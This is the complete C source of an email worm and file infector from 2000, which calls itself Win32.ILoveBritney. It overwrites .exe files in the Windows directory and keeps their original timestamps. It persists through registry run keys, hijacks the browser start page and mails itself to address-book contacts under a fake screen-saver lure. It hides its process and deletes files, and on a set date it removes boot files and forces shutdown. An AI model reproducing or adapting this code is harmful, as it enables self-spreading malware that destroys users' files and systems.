   #include "britney.h"
   #pragma hdrstop
   #pragma warning (disable: 4068)
   #pragma warning (disable: 4001)

   char BritPath[256],BritWinDir[256];
   HKEY BritNTKey,BritWinKey,BritInstKey,BritCrtKey,BritStartKey;
   HANDLE BritHnd,BritHndTime;
   HMODULE KernLib,MapiLib;
   HWND PropHwnd,SystHwnd;
   HDC BritHdc;
   int ColorR,ColorG,ColorB, ColorR1,ColorG1,ColorB1,ColorBkR,ColorBkG,ColorBkB,Width,Height,Cmpi,Err,ErrSend;
   typedef DWORD(*RegSerProc)(DWORD,DWORD);
   typedef ULONG(*EnvoiMess)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
   typedef ULONG(*NomTrouve)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
   typedef ULONG(*MemLibre)(LPVOID);
   LPSTR Nom = "e";
   #pragma argsused
   int WINAPI WinMain
   (
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpszCmdLine,
   int       nCmdShow
   )
   {
   // Win32.ILoveBritney by ZeMacroKiller98
   // And you, do you love Britney ??????????????????
   // Copyright (c) 2000 ZeMacroKiller98
   WIN32_FIND_DATA FindBritneyHost;
   OSVERSIONINFO OsVerInfo;
   FILETIME CreateTime,LstAccTime,LstWriTime;
   SYSTEMTIME BritTime;
   RegSerProc RegisterServiceProcess;
   EnvoiMess MAPIEnvoiMess;
   NomTrouve MAPINomTrouve;
   MemLibre MAPIMemLibre;
   KernLib = LoadLibrary("kernel32.dll");
   MapiLib = LoadLibrary("mapi32.dll");
   RegisterServiceProcess = (RegSerProc)GetProcAddress(KernLib,"RegisterServiceProcess");
   SearchPath(NULL,_argv[0],NULL,sizeof(BritPath),BritPath,NULL);
   OsVerInfo.dwOSVersionInfoSize = sizeof(OsVerInfo);
   GetVersionEx(&OsVerInfo);
   if(OsVerInfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&BritNTKey);
           RegSetValueEx(BritNTKey,"ILoveBritney",0,REG_SZ,BritPath,sizeof(BritPath));
           RegCloseKey(BritNTKey);
   }
   else
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&BritWinKey);
           RegSetValueEx(BritWinKey,"ILoveBritney",0,REG_SZ,BritPath,sizeof(BritPath));
           RegCloseKey(BritWinKey);
   }
   // Internet explorer start page change
   RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main",0,KEY_ALL_ACCESS,&BritStartKey);
   RegSetValueEx(BritStartKey,"Start Page",0,REG_SZ,"http://www.britney-spears.to/site.html",38);
   RegCloseKey(BritStartKey);
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Britney\\Install",0,KEY_ALL_ACCESS,&BritInstKey)!=ERROR_SUCCESS)
   {
           GetWindowsDirectory(BritWinDir,sizeof(BritWinDir));
           SetCurrentDirectory(BritWinDir);
           rename("ssstars.scr","britney.scr");
           BritHnd = FindFirstFile("*.exe",&FindBritneyHost);
           BritneyHostFind:
           BritHndTime = CreateFile(FindBritneyHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           GetFileTime(BritHndTime,&CreateTime,&LstAccTime,&LstWriTime);
           CloseHandle(BritHndTime);
           if((lstrcmp(FindBritneyHost.cFileName,"emm386.exe")==0)||(lstrcmp(FindBritneyHost.cFileName,"setver.exe")==0))
                   goto NotInfection;
           CopyFile(_argv[0],FindBritneyHost.cFileName,FALSE);
           BritHndTime = CreateFile(FindBritneyHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           SetFileTime(BritHndTime,&CreateTime,&LstAccTime,&LstWriTime);
           CloseHandle(BritHndTime);
           NotInfection:
           if(FindNextFile(BritHnd,&FindBritneyHost)==TRUE)
                   goto BritneyHostFind;
           FindClose(BritHnd);
           RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Britney\\Install",&BritCrtKey);
           RegCloseKey(BritCrtKey);
   // Email Propagation usue MAPI functions
   MAPIEnvoiMess = (EnvoiMess)GetProcAddress(MapiLib,"MAPISendMail");
   MAPINomTrouve = (NomTrouve)GetProcAddress(MapiLib,"MAPIResolveName");
   MAPIMemLibre = (MemLibre)GetProcAddress(MapiLib,"MAPIFreeBuffer");
   if((MAPIEnvoiMess==NULL)||(MAPINomTrouve==NULL)||(MAPIMemLibre==NULL))
   {
           MessageBox(NULL,"MAPI function can't found\nPlease refer to help to install it","ILoveBritney Freeware",MB_OK|MB_ICONEXCLAMATION);
           SetCurrentDirectory("C:/");
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MapiMessage stMessage;
   MapiRecipDesc stRecip;
   MapiFileDesc stFile;
   lpMapiRecipDesc lpRecip;
   stFile.ulReserved = 0;
   stFile.flFlags = 0L;
   stFile.nPosition = (ULONG)-1;
   stFile.lpszPathName = BritPath;
   stFile.lpszFileName = NULL;
   stFile.lpFileType = NULL;
   MessageBox(NULL,"Please select email address to send at your friend\nThis program open automaticaly your address book\n","ILoveBritney Freeware",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
   UnResolve:
   Err = (MAPINomTrouve)(lhSessionNull,0L,Nom,MAPI_DIALOG,0L,&lpRecip);
   if(Err!=SUCCESS_SUCCESS)
   {
   switch(Err){
           case MAPI_E_AMBIGUOUS_RECIPIENT:
                   MessageBox(NULL,"The recipient requested has not been or could\n not be resolved to a unique address list entry","ILoveBritney Freeware",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_UNKNOWN_RECIPIENT:
                   MessageBox(NULL,"The recipient could not be resolved to any\naddress.The recipient might not exist or might be unknown","ILoveBritney Freeware",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_FAILURE:
                   MessageBox(NULL,"One or more unspecified errors occured\nThe name was not resolved","ILoveBritney Freeware",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_INSUFFICIENT_MEMORY:
                   MessageBox(NULL,"There was insufficient memory to proceed","ILoveBritney Freeware",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_NOT_SUPPORTED:
                   MessageBox(NULL,"The operation was not supported by the messaging system","ILoveBritney Freeware",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_USER_ABORT:
                   MessageBox(NULL,"The user was cancelled one or more dialog box","AV Intelligent Updater",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           }
   goto UnResolve;
   }
   stRecip.ulReserved = lpRecip->ulReserved;
   stRecip.ulRecipClass = MAPI_TO;
   stRecip.lpszName = lpRecip->lpszName;
   stRecip.lpszAddress = lpRecip->lpszAddress;
   stRecip.ulEIDSize = lpRecip->ulEIDSize;
   stRecip.lpEntryID = lpRecip->lpEntryID;
   stMessage.ulReserved = 0;
   stMessage.lpszSubject = "New Britney Screen Saver";
   stMessage.lpszNoteText = lstrcat("Hi ",(lstrcat(lpRecip->lpszName,"\n\n\tI Send you this mail to give you a new screen saver about Britney Spears.\nI hope your enjoy to have it.\nSee you soon...")));
   stMessage.lpszMessageType = NULL;
   stMessage.lpszDateReceived = NULL;
   stMessage.lpszConversationID = NULL;
   stMessage.flFlags = 0L;
   stMessage.lpOriginator = NULL;
   stMessage.nRecipCount = 1;
   stMessage.lpRecips = &stRecip;
   stMessage.nFileCount = 1;
   stMessage.lpFiles = &stFile;
   ErrSend = (MAPIEnvoiMess)(lhSessionNull,0L,&stMessage,0L,0L);
   if(ErrSend!=SUCCESS_SUCCESS)
   {
           MessageBox(NULL,"A error occured when i try to send email\nPlease refer to your windows help for more informations\n","ILoveBritney Freeware",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MessageBox(NULL,"Thanks to have take this freeware!!!!\nWhich include new screen saver about britney\nNow, send this software to your friend who like me\nIf you want to email me, send at britney@peeps.com",
                   "ILoveBritney Freeware",
                    MB_OK|MB_ICONINFORMATION);
   FreeLibrary(MapiLib);
   }
   RegCloseKey(BritInstKey);
   STARTUPINFO StartFo;
   PROCESS_INFORMATION ProcFo;
   StartFo.cb = sizeof(STARTUPINFO);
   StartFo.lpReserved = NULL;
   StartFo.lpReserved2 = NULL;
   StartFo.cbReserved2 = 0;
   StartFo.lpDesktop = NULL;
   StartFo.dwFlags = STARTF_FORCEOFFFEEDBACK;
   if(CreateProcess(BritPath,
                   NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   FALSE,
                   0,
                   NULL,
                   NULL,
                   &StartFo,
                   &ProcFo))
   {
   CloseHandle(ProcFo.hProcess);
   CloseHandle(ProcFo.hThread);
   }
   RegisterServiceProcess(ProcFo.dwProcessId,1);
   GetLocalTime(&BritTime);
   if((BritTime.wDay==12)&&(BritTime.wMonth==2))
   {
           MessageBox(NULL,"It's Britney Birthday!!!!!\nYou musn't work today...","Win32.ILoveBritney",MB_OK|MB_ICONINFORMATION);
           SetCurrentDirectory("C:/");
           DeleteFile("autoexec.bat");
           DeleteFile("config.sys");
           DeleteFile("io.sys");
           DeleteFile("msdos.sys");
           ExitWindowsEx(EWX_POWEROFF|EWX_FORCE,0);
   }
   else
   {
   if((BritTime.wHour>=8)&&(BritTime.wHour<=18))
           {
                   PropHwnd = GetForegroundWindow();
                   if(SetWindowText(PropHwnd,"Win32.ILoveBritney par ZeMacroKiller98")==TRUE)
                   {
                   randomize();
                   ColorR = rand() % 255;
                   ColorG = rand() % 255;
                   ColorB = rand() % 255;
                   ColorR1 = rand() % 255;
                   ColorG1 = rand() % 255;
                   ColorB1 = rand() % 255;
                   ColorBkR = rand() % 255;
                   ColorBkG = rand() % 255;
                   ColorBkB = rand() % 255;
                   Width = rand() % 640;
                   Height = rand() % 480;
                           BritHdc = GetWindowDC(PropHwnd);
                                   SetBkColor(BritHdc,RGB(ColorBkR,ColorBkG,ColorBkB));
                                   SetTextColor(BritHdc,RGB(ColorR,ColorG,ColorB));
                                   TextOut(BritHdc,Width,Height,"Britney Spears is very beautiful girl!!!",40);
                                   SetTextColor(BritHdc,RGB(ColorR1,ColorG1,ColorB1));
                                   TextOut(BritHdc,Width,Height,"If you don't think that, you think it now, Ha Ha Ha Ha !!!!!",58);
                           ReleaseDC(PropHwnd,BritHdc);
                   }
           }
           if((BritTime.wHour>18)&&(BritTime.wHour<8))
           {
                   MessageBox(NULL,"You can't use your PC, now!!!\nIt's time to stop your computer...","Win32.ILoveBritney",MB_OK|MB_ICONSTOP);
                   ExitWindowsEx(EWX_POWEROFF|EWX_FORCE,0);
           }
   }
   FreeLibrary(KernLib);
   return 0;
   }
